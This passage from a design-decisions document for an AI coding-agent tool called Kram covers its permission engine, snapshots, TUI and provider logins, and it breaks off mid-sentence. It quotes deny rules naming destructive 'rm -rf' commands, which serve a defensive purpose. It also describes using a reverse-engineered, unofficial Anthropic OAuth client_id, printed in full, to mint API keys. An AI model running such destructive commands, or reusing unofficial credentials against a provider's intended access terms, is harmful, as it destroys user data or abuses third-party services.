**Why not just extend disabled to be argument-aware:** enabled/disabled
answers "does the model ever see this tool"; policy answers "given this
specific call, does it run, get confirmed, or get refused". Conflating them
would mean a tool that's mostly fine but has one dangerous invocation shape
has to be all-or-nothing.

### Approval is not `ask_question`

`ask_question` means "I don't know enough to proceed." A policy-gated
approval means "I know exactly what I want to do, but policy requires
sign-off first." These are told apart deliberately —
`tools.Asker`/`tools.Approver` are separate interfaces, `EventQuestion`/
`EventApproval` are separate SSE event kinds, `/sessions/{id}/answer` and
`/sessions/{id}/approve` are separate endpoints, with separate pending-id
maps on `agent.Service`. Reusing one mechanism for both would make a
policy pause look, to the model and the user, like the agent being unsure —
which it isn't.

### Compatibility default is Allow, always

An install with no `permissions.json` anywhere (global or project) behaves
exactly as Kram did before this feature existed — every rule evaluates
against a default of `Allow` unless a policy file explicitly sets
`"default": "..."`. Shipping a permission engine must never make existing
users start getting asked about things they were never asked about before.

### Precedence: most-specific-match, not first-match

Rules are scored (exact tool + exact pattern > exact tool + wildcard >
glob tool name), and the highest-scoring matching rule wins, ties broken by
declaration order (later wins). "First rule in the file wins" was rejected
because it makes behavior silently depend on file layout — reordering two
unrelated-looking lines could flip what a specific command does.

### A grant persists the exact approved subject, never a widened pattern

Choosing "always" on `bash: git push origin feature/foo` persists exactly
that literal command string as a new Allow rule
(`.kram/permission_grants.json`, project-scoped — an approval in one
project has no business applying to another) — never `bash: allow "*"`. A
policy engine that silently widens what it remembers approving is more
dangerous than one that keeps asking. Grants are evaluated at the same
specificity as an equivalent hand-authored rule and appended after the
configured policy, so at equal specificity they win the tie against a
same-shaped `ask` rule — which is the point: approving something "always"
should stop it asking again for that *exact* case, nothing broader.

A grant earned mid-run takes effect on the *next* run, not immediately —
the `Evaluator` a run is using was already built for that run. This is the
same tradeoff memory snapshotting already made (see Memory, "Snapshotted
per run"): rebuilding policy state mid-turn was rejected for the same
reason rebuilding the tool registry mid-turn was never on the table.

### A fully-denied tool is hidden; a partially-denied one stays visible

If every rule mentioning a tool says Deny (or the global default is Deny
and nothing else mentions it), the tool is dropped from `Definitions()` —
same treatment `toolsettings`-disabled tools get, since a capability the
model can never successfully use shouldn't cost tokens in the schema. A
tool denied only for some patterns (`rm -rf *` denied, everything else
allowed) stays visible: it's still sometimes usable, and the policy is
enforced at call time regardless.

### The policy "subject" is a per-tool best-effort extraction, not a generic mechanism

`bash`'s subject is its `command`; file tools' is `path` (`move_file`'s is
`"old -> new"`); everything else (custom manifest tools, MCP tools,
`delegate_task`) falls back to the raw argument JSON. This is a known
simplification, not a general "tools declare their own policy subject"
interface — building that felt like speculative generality for a v1 where
only bash and the file tools have an obvious single field worth pattern-
matching on. Revisit if a real policy needs fine-grained matching on a
custom or MCP tool's arguments.

---

## Artifacts

### The producer, not just the reported size, had to be bounded

`bash`/custom tools used to capture output as `var out bytes.Buffer`, and
only checked a size cap *after* `cmd.Run()` returned. That cap bounded what
was reported, never what was actually held in memory while the command
was still producing output — a runaway command could inflate that buffer
arbitrarily before the cap was ever consulted.

**Fix:** `artifact.SpillWriter` is used directly as `cmd.Stdout`/`Stderr`.
It buffers up to a threshold, and the moment a write would cross it,
switches to streaming straight to a temp file for everything after — the
in-memory buffer provably never exceeds the threshold, at any point during
the command's entire run, not just at the end.

### Spilled output becomes an artifact, not a truncated-and-lost tail

Where the old cap just cut the output off (`[output truncated]`, the rest
gone forever), a result that crosses the threshold is now saved whole to
`.kram/artifacts/<id>.bin` (plus a `.json` sidecar of metadata — session,
tool, size, sha256), and the tool result becomes a short preview plus an
`artifact_read`-able reference. Nothing is lost; it's just not inline.

### `artifact_read` resolves ids, never paths

An artifact id (`art_<16 hex chars>`) is validated against a fixed pattern
before ever being joined into a filesystem path (`Store.paths`) — there is
deliberately no way to pass a real path through this tool. The model gets
a reference to something Kram itself created, never an arbitrary-path
reader.

### Deterministic filtering still runs first — but only on inline results

`filterCommandOutput` (see Tools, above) still applies to output that
stayed under the spill threshold. A spilled result skips it: filtering
exists to compress noisy multi-thousand-line output down to signal, and a
spilled result is already a short preview plus a reference, not something
that benefits from the same treatment.

### The aggregate per-turn budget is enforced by truncation, not retroactive spill

`maxTurnToolOutputChars` bounds the *combined* size of every tool result
within one model turn's batch of calls — several individually-fine
results (each under its own tool's cap) can still add up. This is
deliberately simpler than what a "spill the largest until under budget"
approach would need: buffering an entire turn's tool results before
persisting any of them, a bigger structural change to a loop this project
has already had one real silent-failure bug in (see Boundaries, "A weak
model's empty final answer..."). A result that crosses the aggregate
budget is truncated with an explicit notice — never silently dropped,
same discipline as everything else in this section.

### GC is best-effort disk hygiene, not correctness

`Store.GC` runs once per daemon startup (registry construction), deleting
artifacts older than 7 days. Not a background timer, not something a
long-running daemon needs to schedule — a workspace gets reopened often
enough in practice that "once at startup" is enough, and a garbage-
collected artifact simply becomes an unresolvable id if referenced later,
the same outcome as if it had never spilled.

---

## Workspace snapshots

### A second, isolated git repository as the storage engine

`internal/snapshot` gives Kram a way back if an agent breaks something:
`Store.Create` captures the workspace's current files, `Store.Restore`
brings them back. The engine is git — but a completely separate
repository, `--git-dir` pointed at `<workspace>/.kram/snapshots/.git`,
operating against the real workspace as its `--work-tree`. Every
operation (`add`, `commit`, `diff`, `reset --hard`) targets that isolated
`--git-dir` exclusively, via `os/exec` calling the system `git` binary —
same philosophy as `internal/daemon/tools/git.go`'s read-only
`git_status`/`git_diff`, and the same "external capability, explicit
subprocess" pattern MCP/LSP/custom tools already use.

**Alternative considered:** a pure-Go git implementation (e.g. `go-git`)
instead of shelling out. **Rejected:** it would be a new, fairly heavy
dependency for functionality the system `git` binary already provides
correctly, and this project already treats "shell out to a real binary"
as the default posture for external capabilities (shell, LSP servers, MCP
servers) rather than reimplementing protocols in Go where a battle-tested
binary exists. `go-git`'s `reset --hard`-equivalent semantics are also
less battle-tested than actual git's for this exact operation — being
this careful about "never touch the user's real repo" is not where you
want the least mature implementation of the mechanics doing the work.
This mirrors the MCP decision ("No SDK... it preserves the pure-Go,
static-binary, no-surprise-dependencies property") in spirit, but lands
on the opposite side, because here git the binary — not a Go
implementation of git — is genuinely the more reliable, better-tested
tool for the job, and the project already depends on git being present
for `git_status`/`git_diff`.

**Why this never violates "never touch the user's real git":** the
isolated repository shares a filesystem with the user's repo but nothing
else — different `--git-dir`, different index, different HEAD, different
branch, different identity (`user.email`/`user.name` set locally to this
hidden repo's own config only), different history. `git reset --hard`
against *this* `--git-dir` is not the dangerous command the invariant
bans — that ban is specifically about the user's own `.git`, which this
package never points at for any command. Verified directly, not just
argued: `snapshot_test.go`'s `TestSnapshotNeverTouchesUserGitState`
stages a real change in the user's real repo, takes a snapshot, restores
it, and asserts the user's branch, HEAD, staged blob, and `git status
--short` output are byte-identical before and after.

### The .gitignore question: respected, on purpose

Deciding what "the current state of the workspace" means for `Create`
had two options: capture literally everything (minus `.git`/`.kram`), or
respect the user's own `.gitignore`. **Chosen: respect it.** Concretely,
this falls out of the isolated-repo design for free — git discovers
`.gitignore` files by walking the `--work-tree`, which is the same
directory the user's own `.gitignore` files live in, regardless of which
`--git-dir` is doing the walking. `node_modules`, build output, `.env`,
and anything else the user already excludes from their own history stays
excluded from snapshots too.

**Why this is the right default:** it matches what `git status` already
tells the user is "their" content worth tracking, keeps snapshots small
and fast even in JS-shaped repositories, and means a `.env` with real
secrets doesn't get duplicated into a second, less-obviously-guarded
git history under `.kram/`. The tradeoff is real and worth naming: a
gitignored file (a local override config, a generated file the user
actually cares about recovering) is not protected by this mechanism at
all. `.git` and `.kram` are excluded unconditionally regardless of
`.gitignore` content, via the isolated repo's own `info/exclude` — not
delegated to the user's `.gitignore`, since a workspace that happens not
to ignore `.kram` must still never snapshot its own snapshot history.

### Restore over a stale snapshot: overwrite and report, never silent, never refuse

Between taking a snapshot and restoring it, the workspace can keep
changing — including via further snapshots. Two honest options existed:
refuse to restore if anything changed since, or apply it anyway.
**Chosen: apply it anyway, but never silently.** `Store.Restore` always
returns a `RestoreResult` naming every path it touched and how (`will be
overwritten` / `will be restored` / `will be removed`), computed via
`git diff --name-status` *before* the mutating `reset --hard` runs, and
the `snapshot_restore` tool's result text lists every one of them.

**Why not refuse on staleness:** detecting "has anything changed" well
enough to be trustworthy is closer to a three-way merge problem than a
timestamp check, and a refusal still needs a way to proceed — which just
becomes a second code path to get right. Reporting what changed, always,
does the actual job: nothing about a restore's effect is hidden from
whoever asked for it. This is consistent with the project's existing
"never silently drop or truncate" discipline (see Tools, "Deterministic
output filtering" and Artifacts, "Spilled output becomes an artifact").
Consistent too with the Permissions section's default posture
(compatibility default is Allow, not a blocking gate) — the mutating gate
for `snapshot_restore` is the permission engine every tool already goes
through by being registered normally, not a bespoke confirmation step
reimplemented here.

**A deliberate, narrower boundary, also tested:** `Restore` only ever
undoes what some snapshot *actually captured*. A file created in the
workspace after the most recent `Create` call, never captured by any
snapshot, is left completely alone by `Restore` — this falls directly out
of using `git reset --hard` against the isolated repo (it only touches
paths that differ between the isolated index and the target commit;
a file the isolated repo has no index entry for at all is invisible to
it, by git's own design). This is a feature, not a gap: Kram will never
delete a file it has no record of, the same conservative instinct behind
`delete_file` refusing directories. See
`TestRestoreLeavesNeverSnapshottedFileAlone`.

### Registered as normal tools, not a special-cased mechanism

`snapshot_create`/`snapshot_list`/`snapshot_diff`/`snapshot_restore` are
ordinary entries in `internal/daemon/tools`'s `Registry`, exactly like
every other tool — they inherit `permission.Evaluator`/`Approver` gating
automatically by virtue of being registered, same as the Permissions
section's "a policy layer is a different thing from enabled/disabled"
already guarantees for everything in the registry. No bespoke plumbing
was needed or added. `snapshot_restore`'s description states plainly
that it is destructive and requires an explicit id (never "restore the
latest") — the tool-level protection against acting on stale information
is that explicitness plus the always-reported change list, not a second
confirmation mechanism duplicating what the permission engine's `ask`
policy already exists to provide for exactly this kind of call.

### Known gap: no automatic snapshotting

This round implements the capability only — `snapshot_create` must be
called explicitly (by the model or the user), never automatically before
a mutating tool call. Auto-snapshotting before every `write_file`/
`edit_file`/`delete_file`/`bash` call was explicitly out of scope for this
round, to keep it small and let the primitive prove itself first. A
natural next step, not built: a policy-driven "snapshot before this
category of call" hook, likely living in `internal/permission` or the
agent loop rather than this package, so `internal/snapshot` itself stays
a pure capability with no opinion about when it's used.

---

## Local state

### The config directory is `kram-gateway`, not `kram`

**Found the hard way:** `~/.config/kram` on the development machine was
already in use by a completely unrelated tool. The first write went into
someone else's config directory.

**Why it matters:** short names collide. The repo's actual name doesn't.

### Credentials are a `0600` file, not encrypted

**Why:** there is no key-management story for a local single-user CLI
that would make "encrypted JSON readable only by code that ships the
decryption key" meaningfully safer than file permissions. `gh` and the
AWS CLI make the same call. Pretending otherwise would be security
theater.

### Env vars always win over stored keys

`cmd/kram` loads stored credentials into the environment only where the
real env var is unset.

**Why:** an explicitly exported variable is an explicit instruction. The
stored key is a convenience for the common case, not an override.

---

## Interface

### One left-aligned column, not two-sided chat bubbles — *reversed decision*

**First version:** user messages right-aligned, agent left, like a
messaging app.

**Reverted because:** it read worse. A terminal transcript is a log, not a
conversation UI; the eye wants one column and a tag. User text is
colored distinctly instead, so a turn is still identifiable at a glance.

Worth recording that the *bug fix* underneath it was real and subtle:
`lipgloss.Style.Width()` pads short content with trailing spaces, so
measuring the padded string gave the box width rather than the content
width, and short messages rendered left-shifted inside an invisible box.

### The right-aligned prompt block is a narrower exception, not a reversal of the reversal

Combos v2 gave the user's own message a right-aligned block (a small
"you" label, a colored vertical accent on the left edge, width shrinking
to fit short content) — worth being precise about why this doesn't
contradict the entry above.

**The distinction:** the earlier reversal was specifically about
*two-sided chat bubbles* — full boxes on both sides, agent left / user
right, reading like a messaging app. That's still rejected. What's new is
an asymmetric exception for the user's own prompt *only*: no full border,
no tail, no background card spanning the width, and Kram's own replies
stay exactly as they were (left-aligned, unstyled, integrated into the
transcript). The goal is hierarchy — instantly telling apart "what I
typed" from "what Kram said" — not turning the transcript into a
conversation UI.

**The bug this reversal already caught stayed fixed:** the block's width
is computed from the actual wrapped content (via `reflow/wordwrap`, then
measuring the longest resulting line), never from `lipgloss.Style.Width()`
— avoiding exactly the "short content padded into a wide invisible box"
mistake recorded above.

### Nothing in the UI is simulated

The footer's latency, fallback trail, breaker states and token counts all
come from the gateway's own counters. The context panel is computed by
the same code path that decides when to compact. Combos v2 extends this
same rule to routing: the route bar, the Ctrl+R trace, and Ctrl+P's score
breakdown all render facts the router/gateway already decided — nothing
is guessed, interpolated, or recomputed in the TUI. The one deliberate
exception is a candidate rail while a model call is actually in flight: its
node count comes from the real combo, but the moving highlight is explicitly
generic activity rather than faked per-attempt progress (see "Route bar:
per-model-call granularity, not per-attempt" below) — there was never a
version of this that simulated which candidate was "currently" being tried.

**Why:** a panel that can disagree with reality is worse than no panel. It
also means the two can never drift.

### Route bar: per-model-call granularity, not per-attempt

The route bar shows an animated rail with the real number of configured
candidates while a model call is in flight, then the real fallback trail once
it's done — it does not show "now trying candidate 2 of 3" live, mid-call. The
rail's moving focus means only "routing is active"; provider names, outcomes,
and latencies appear only when `route_done` makes them facts.

**Why this isn't a shortcut:** it's structurally true, not a scope cut.
The gateway's fallback loop (try candidate 1, try candidate 2, ...) runs
entirely inside a single HTTP round-trip the daemon only ever observes
the *result* of. For a streaming request specifically, no bytes are even
sent to the client until a candidate's `router.BoundedPeek` commits — a
failed early candidate never gets an open connection to report progress
over in the first place. Showing fake "now trying X" progress would be
exactly the kind of simulation the interface principle above forbids.
Real per-attempt live events would require the gateway itself to push
progress over a channel that exists before any candidate has committed,
which is a materially different transport (a second connection, or a
protocol upgrade) — deferred, not silently dropped; see "Known gaps."

### Live routing events are per model call, not a new event bus

`route_start`/`route_done` reuse the exact SSE/event-callback machinery
`tool_start`/`tool_result`/`notice`/etc. already use — no new transport,
no second WebSocket, no polling endpoint. `route_done` carries one
`RouteCall` (see below); the final `done` event carries the whole
`RouteTrace` for the completed turn.

### `RouteTrace` fixes a real bug: only the last model call's trail was ever visible

`agent.go`'s turn loop used to do `result.Attempts = callResult.Attempts`
on every iteration — a turn with several tool round-trips (read a file,
grep, edit, run tests, answer) silently discarded every earlier model
call's real fallback trail except the very last one. A user watching a
multi-step task would only ever see routing information for the *final*
answer, never for the four model calls that preceded it, even though
those all really happened and may have had real fallbacks of their own.

`RunResult.Attempts` is kept exactly as it was (the last call's trail —
still what the plain footer would use, before the footer itself dropped
routing detail entirely, see below); `RunResult.RouteTrace` is the new,
complete accumulator (`agent.RouteTrace`/`agent.RouteCall`), and Ctrl+R
is what makes it visible.

### Footer stops duplicating the route bar

The footer used to be two lines: a provider/latency/sparkline summary,
then a row of anonymous colored dots (one per attempt) plus a count.
Once the route bar showed the *same* fallback trail with real provider
names, outcome glyphs, and latencies — strictly more information, in a
more prominent, always-visible position — the footer's routing detail
became pure duplication. The footer is now one line: token usage on the
left, the context-usage icon and keyboard shortcuts (including the new
`^r`) on the right. Detailed routing lives in exactly two places now: the
route bar (live summary) and Ctrl+R (full trace) — never a third,
redundant copy.

### Ctrl+R and Ctrl+P: the router's own data, rendered, never recomputed

Both panels are strict projections of data the gateway/router already
computed and sent over the wire (`openai.AttemptInfo`/
`RankedProviderInfo`/`ScoreFactor`) — see "Strategy explainability" in
the Routing section above for why the wire format carries the full
ranking (every eligible candidate, not just the ones actually attempted)
specifically so this is possible without a second scoring pass in the
TUI. Ctrl+P falls back to the pre-Combos-v2 provider-list/telemetry view
for non-scoring strategies (priority, round-robin, prefix-affinity),
which never produce a ranking — there's nothing to show a breakdown of.

### Strategy selection is live, atomic, and deliberately session-scoped

The route bar's strategy block is a control as well as a status label: its
`▾`, a mouse click, or `Ctrl+S` opens the same picker. The available names come
from `GET /admin/status`, whose list is exported by the router itself, rather
than being duplicated in the TUI. Selection calls `POST /admin/strategy`; the
control-plane mutation is rejected for non-loopback peers even if someone has
intentionally exposed the inference endpoint to a LAN.

`Router.SetStrategy` replaces the combo with a new immutable snapshot under
the router lock instead of mutating a strategy pointer that an in-flight rank
may still be reading. Calls already ranked finish under the old snapshot;
future calls see the new one. Switching also creates a fresh strategy instance,
so state owned by round-robin/sticky/LKGP does not leak across strategy modes.

The selection is runtime-only. Silently rewriting an explicit, workspace, or
global config file from a generic gateway admin endpoint would make ownership
ambiguous and could persist a TUI experiment into unrelated sessions. The
picker says the next call changes immediately; durable policy remains an
explicit `config.yaml` edit.

### Two real bugs, found only by testing this live

Both were caught by actually running the CLI against real mock providers
in a tmux session and reading the output — not by any unit test, since
neither is the kind of thing a value-level test would think to check:

1. **Route bar spurious truncation at exact width.** `reflow`'s
   ANSI-aware `truncate.StringWithTail` unconditionally reserves room for
   its tail string, even when the input isn't actually over the limit —
   so a line landing at exactly the terminal width got a spurious `…`
   appended and its real last character silently dropped. Fixed by only
   invoking `truncate` when the rendered width genuinely exceeds the
   target (`lipgloss.Width(result) > m.width`), confirmed by a test that
   sweeps widths 10 through 140 against long real provider names.
2. **Ctrl+P's score breakdown silently truncated by panel height.** The
   provider-list header plus a full six-factor breakdown together
   routinely exceeded the shared panel height budget, so `padLines`'s
   `lines[:height]` cut the output off *before* the factor lines were
   ever appended — this looked exactly like the ranking data being empty
   end to end, and was diagnosed as a data bug for a while before a
   direct `curl` against the gateway's raw SSE output proved the wire
   format was always complete. Fixed two ways: the panel now shows a
   *focused* single-candidate breakdown instead of the provider list plus
   the breakdown at once when real ranking data exists (matching the
   original design mockup more closely, and using far less vertical
   space), and the shared panel height itself grew (`height/3`, floor 9,
   was `height/4`, floor 6).

Both are recorded here as a concrete argument for the "test live in a
browser/terminal before calling a UI change done" rule already in this
project's own operating instructions — a passing `go build` and `go vet`
told us nothing about either bug.

---

## First-run setup wizard

### The trigger is onboarding state, not "is a provider configured"

**Found as a real gap in the first draft of this feature.** The obvious
trigger — run the wizard when `detectGatewayConfig` would fail with "no
provider configured" — has a real hole: someone who already exports
`ANTHROPIC_API_KEY` would never see the wizard at all, and so would never
get asked about routing, permissions, or tools. It also means a user who
pastes one key via the wizard's provider step and then cancels *before*
finishing would silently never see the wizard again — that credential is
now enough to make `detectGatewayConfig` succeed on the next run.

The actual trigger is a small versioned marker
(`internal/onboarding`, `kramhome.Path("onboarding.json")`,
`{version, completed, projects_root, last_workspace}`): the wizard runs
when `!completed || version < currentVersion`, full stop, independent of
what's already configured. `-setup` forces it regardless of `completed`.
This is also what makes a version bump a clean way to force existing
installs through a redesigned wizard later — no migration logic, just a
fresh run.

### Two stages, one continuous-feeling flow

Steps 1-5 (Environment, Projects, Providers, Routing, Permissions) run in
a **second, standalone `tea.Program`** (`app.RunWizard`), entirely before
the gateway/daemon exist — they have to, since producing the config those
two need to start *is* what these steps do. Steps 6-8 (Tools & Skills,
System Check, Ready) run in the **normal post-daemon program**, entered
directly via a new `app.New` parameter instead of the session picker,
because listing what tools/skills are really registered needs a live
daemon connection (`GET /tools`) that can't exist yet during Stage 1.

Both stages share one `renderWizardHeader` (`N/8 Title`) so the split is
invisible to the user — matching the explicit design goal that the
wizard read as one flow, not "the setup ended and I fell into an
unrelated tools screen." The Providers step doesn't get a third phase of
its own; it reuses `phaseAccounts` (the existing accounts screen)
directly, gated by a `wizardMode` bool, since nothing in that screen's
render/handle path touches the daemon/gateway clients that don't exist
yet — confirmed before reusing it, not assumed.

### Provider validation is real, not inferred from "a key exists"

Each key paste or completed OAuth immediately triggers the same
`providerping` check the accounts screen already uses for its status
dots (`internal/providerping`, a minimal "list models" call — never a
full chat request), instead of waiting for a manual re-check. A
"Gateway mode: BASIC/RESILIENT" line reports genuine independent-account
count, explicitly not counting OpenRouter's three free-model *routes* as
three upstreams — they share one account and one rate limit.

### Permission presets are real `PolicyFile` values, checked against the real engine

`internal/permission` gained `RecommendedPolicy()`/`StrictPolicy()`/
`AutonomousPolicy()` plus `SavePolicy` — not a parallel, simplified rule
language for onboarding, the exact same `Rule{Tool, Pattern, Decision}`
matching described in "Permissions" above. Writing the three presets
surfaced two things worth being explicit about in the wizard's own copy
rather than leaving as a surprise:

- Strict's `default: "ask"` means *every* unlisted tool asks, including
  every `mcp__*` tool — not just tool names the preset doesn't mention.
- Autonomous's one safety rule (`bash`, pattern `"rm -rf /*"`, deny) is a
  prefix glob, so it blocks any `rm -rf` on an absolute path
  (`rm -rf /home/x`, not just literally `rm -rf /`) while leaving
  relative-path deletes (`rm -rf node_modules`) alone — a real behavior
  test (`internal/permission/presets_test.go`) caught the difference
  between "blocks one literal command" (what the first draft's comment
  claimed) and "blocks a whole class of absolute-path deletes" (what the
  prefix-glob engine actually does) before it shipped as a doc lie.

### Config precedence gained a global tier, and the port-reuse trap that comes with it

`loadOrDetectGatewayConfig` now resolves, in order: explicit `-config` →
`<workspace>/.kram/config.yaml` (a per-project override, hand-written or
future-wizard-generated — nothing writes this automatically today) →
`kramhome.Path("config.yaml")` (what the wizard actually writes) → plain
env-var autodetection. Both new file tiers deliberately do **not** trust
whatever port is written in the file — they call `freePort()` just like
plain autodetection does, unless `-gateway-port` was explicit. A global
config is shared across every workspace; reusing its file's port would
let two `kram` instances in two different project directories collide
trying to bind the same one, a real regression an early draft of this
change would have introduced.

`config.Save` writes with a temp-file-then-rename (removing any existing
file first, since `os.Rename` fails over an existing target on Windows,
unlike POSIX) rather than truncating the destination in place — a reader
should never be able to observe a half-written config. The generated
file also always sets `response: {reject_empty: true, require_terminal:
true}` on the wizard's combo — a safe default for a brand-new install,
never retrofitted onto a config the wizard didn't generate.

### Two real bugs found only by running the wizard in tmux, not by `go build`/`go vet`/tests

1. **`syncViewportSize` panicked in wizard mode.** `Update`'s
   `tea.WindowSizeMsg` case unconditionally called
   `m.input.SetWidth(...)` on the chat composer — but `newWizardModel`
   never calls `textarea.New()` for Stage 1 (there's no message composer
   in the wizard), leaving `m.input` a zero-value `textarea.Model`.
   `SetWidth` on that zero value panics. Every unit test, `go build`, and
   `go vet` passed; only starting the actual binary in tmux crashed
   immediately on the first resize event. Fixed by skipping
   `syncViewportSize`/markdown-renderer setup entirely when
   `wizardMode` — Stage 1 never renders any of that.
2. **The Ready screen showed "Routing: auto" and a blank "Permissions"
   row no matter what was actually chosen.** Stage 1 and Stage 2 are
   *separate* `Model` instances in separate programs — Stage 2's summary
   step was reading `m.wizardChosenStrategy`/`m.wizardChosenPermPreset`
   off its own, freshly-constructed `Model`, which never inherited
   anything Stage 1 decided. `go build` had no way to catch this: both
   fields exist, both are valid strings, they're just always empty on
   the model that was actually rendering. Only watching the real summary
   screen (mid-manual-walkthrough, with `smart`/`recommended` chosen
   moments earlier) revealed it showing the zero-value fallback instead.
   Fixed by threading a small `WizardResult` (Stage 1's actual choices)
   through `app.New` as a new parameter, read only when
   `openOnToolsPreset` is true.

Both are recorded here as further evidence for the same rule the route
bar/score-breakdown bugs above already argued for: a passing test suite
proves the code is internally correct, not that the feature behaves
correctly end to end. This wizard was walked through fully in tmux,
including a real OpenRouter account, before being called done — both
bugs were caught that way, neither by static checks.

### What Kram does *not* do here, on purpose

No shared/relay API key ships with Kram, and no session gets bootstrapped
against another product's hosted service. OpenCode Zen (one of Kram's own
catalog providers) was checked directly and requires billing details to
sign up — not a genuine zero-friction option — so it isn't presented as
one. OpenRouter's already-working, per-user OAuth flow (no card, a real
key, Kram's own rate limit exposure is zero) is the wizard's actual
"click one button" path. Building and hosting a shared relay the way a
company-backed product might is a real, ongoing cost/liability decision
for a solo maintainer — not something to introduce as a side effect of an
onboarding flow.

## Browser login for Anthropic and OpenAI (Claude Pro/Max, ChatGPT Pro/Plus)

The wizard's Phase 2 backlog (see above) named "OAuth/browser-auth for
providers beyond OpenRouter" as deferred. This closes that specific item
for Anthropic and OpenAI — Gemini and OpenCode Zen remain key-only, since
neither offers a subscription-login flow to build against.

The first pass shipped here got Anthropic's actual credential shape
wrong, and only real end-to-end testing against a live account (not
`go build`, not a fake authorization code) caught it — worth recording
in detail since it changed the design, not just a bug fix.

### Anthropic: the OAuth access token is not itself a usable credential — it mints one

The first implementation sent Anthropic's OAuth access token straight
through as `Authorization: Bearer` on every request, mirroring
OpenAI's flow. Live-tested against a real Claude Pro/Max account: every
request built that way — `/v1/messages`, `/v1/models`, ping included —
came back `403 permission_error`, `"OAuth token does not meet scope
requirement any_of(user:inference, ...)"`, even though `user:inference`
was explicitly requested in the authorize call's scope. An active Pro/Max
subscription didn't change this.

What actually works, also confirmed live against the same account: the
token's `org:create_api_key` scope is for exactly one thing — a single
POST to `https://api.anthropic.com/api/oauth/claude_cli/create_api_key`
(`Authorization: Bearer <oauth access token>`), which mints a real,
permanent `sk-ant-...` API key (`expires_at: null`) on the account that
just authorized Kram. That key works precisely like any pasted one —
confirmed by sending it as `x-api-key` against `/v1/messages` and getting
a coherent, unrelated error back (`"Your credit balance is too low"` —
an Anthropic Developer Console billing state, entirely separate from a
Claude Pro/Max chat subscription; the two are unrelated balances). So
`internal/oauthflow.AnthropicAuthorize` does the code exchange and this
create-key call back to back and hands back a permanent string, the same
shape `OpenRouterAuthorize` already returns — there is no refresh path
for Anthropic, and no second `Bearer`-auth mode in
`internal/provider/anthropic.go`. Both existed in the first pass and were
removed once this was understood; `internal/credentials.Store`'s
`OAuthToken`/`Resolve`/refresh machinery still exists, but Anthropic
never touches it.

### OpenAI's ChatGPT login really does need the refreshable-token machinery — and needed a fixed callback port

OpenAI's flow is the case that machinery was built for: the access token
*is* the usable credential (Bearer, straight to the Codex Responses
backend), but it's short-lived and must be refreshed — confirmed by the
same live-testing discipline, sending a fabricated code straight to
`auth.openai.com/oauth/token` and getting a coherent `token_expired`
rejection back rather than a client or shape error.

A second real bug surfaced the same way: the authorize URL was rejected
outright by `auth.openai.com` — `"invalid_authorize_request"` — visible
directly in a browser, before any login prompt. The cause was the local
callback listener's port: it was ephemeral (`net.Listen("...:0")`), but
OpenAI's authorization server validates `redirect_uri` against an
allowlist registered for this client_id, and the `opencode` client this
was extracted from hardcodes port `1455`, not a dynamically chosen one.
Kram's callback listener now binds that same fixed port — if something
else already owns it locally, the flow fails to start with a clear error
naming the requirement, rather than silently trying a different,
guaranteed-to-be-rejected one.

### OpenAI's ChatGPT login is a different product, not an alternate way to fill `OPENAI_API_KEY`

It only authorizes access to a separate, Codex-branded backend
(`chatgpt.com/backend-api/codex/responses`, the Responses wire format,
not Chat Completions) serving a restricted model set — never
`api.openai.com`. Presenting it as a second way to configure the existing
`openai` catalog entry would be a real correctness bug dressed up as a
convenience: the resulting token simply doesn't work there. It's its own
catalog entry (`openai-chatgpt`) and its own adapter
(`internal/provider/openai_responses.go`, `Kind: "openai-responses"`).

The live Codex backend also requires two request flags that the public
Responses API shape does not make safe to infer from zero values: streaming
must be enabled and persistence must be disabled explicitly. Authentication
can succeed while an otherwise valid request still fails with `400 Store must
be set to false`. `responsesRequest.Store` therefore deliberately has no
`omitempty` tag and every request sends `"store": false`; a wire-level test
guards the field's presence, not merely its Go zero value. This was verified
end to end with a real ChatGPT subscription through Kram's gateway, which
returned content from `openai-chatgpt` rather than a fallback provider.

### Anthropic's client_id is real but unofficial — said so, not hidden

There is no public, documented OAuth client Anthropic offers third-party
tools. The `client_id` this uses (`9d1c250a-e61b-44d9-88ed-5944d1962f5e`)
is only known because it's been reverse-engineered from Anthropic's own
`claude` CLI by outside projects — not something extracted from `opencode`
(which, unlike its fully-implemented "login with ChatGPT" flow, turned
out to have no working Anthropic OAuth implementation anywhere in its
shipped bundle, despite showing the UI label for one). Both the
authorize/token exchange and the create-key call were live-verified
against a real account, not just probed with a fabricated code — see
above. Framed honestly in the accounts screen's label ("beta") rather
than presented as sanctioned, first-class support.

### The lesson this reinforces: `go build` proves nothing about whether an OAuth flow actually works

Every prior finding in this file about live-tmux-testing catching what a
clean build can't (see "Two real bugs found only by running the wizard
in tmux" above) applied again here, at higher stakes: a scope-mismatched
Bearer token and a rejected authorize URL both look identical to a
successful flow in source code, and both were only caught by sending
real requests to Anthropic's and OpenAI's real servers — first with
fabricated codes to sanity-check endpoints/shapes without needing a
login, then, for Anthropic, by working through the actual live account
data once a real connection had been made through the wizard.

## The default combo's fallback chain, diagnosed from real gateway logs

A real symptom from actual daily use, not a synthetic test: a wizard-
configured "RESILIENT, 4 upstreams" combo was failing *every* candidate
on most second-and-later prompts in a session, traced from the real
`kram.log` a live session produced (not guessed from source reading —
see "Two real bugs found only by running the wizard in tmux" above for
why that distinction matters here too). Six candidates, six different
failure reasons, three worth recording:

**Gemini's pinned model was retired out from under it.** `gemini-2.5-pro`
(the catalog's `DefaultModel`) 404'd on every single real generation
call: `"This model models/gemini-2.5-pro is no longer available to new
users."` The trap: `GET /v1beta/models` — the same endpoint
`providerping`'s Gemini check calls — still lists it, unflagged, as
supporting `generateContent`. A ping that only checks the model's
presence in that list, or a hypothetical future "fetch available models"
feature that trusted it, would both have kept reporting this as healthy.
`gemini-2.5-flash` turned out to be retired the same way when tried as a
replacement. Google's own `gemini-flash-latest`/`gemini-pro-latest`
aliases exist specifically to not rot like a numbered release does —
live-tested (a real streamed response, then a real tool call) before
pinning `gemini-flash-latest` as the new default.

**OpenRouter's free reasoning models were never actually broken — Kram
was.** `openai/gpt-oss-20b:free` and `nvidia/nemotron-3-super-120b-a12b:free`
failed with `"no meaningful content within the peek window"` on nearly
every attempt. Direct testing (`curl -N` against a real streaming
request) showed why: both are reasoning models that stream a chain-of-
thought (OpenRouter's `delta.reasoning` field) for several seconds
*before* any real answer content — and `internal/provider/openai_compat.go`
didn't capture that field at all, so every reasoning fragment produced
zero `StreamEvent`s. From `router.BoundedPeek`'s side, that reads as
total silence; its fixed 5-second-from-start timer fired before real
content ever arrived, and it gave up on a model that was actively working
the whole time. Fixed at both ends: `openai_compat.go` now forwards
reasoning fragments as `StreamEvent.Reasoning` (a new field, kept
strictly separate from `Delta` — reasoning is not the model's answer and
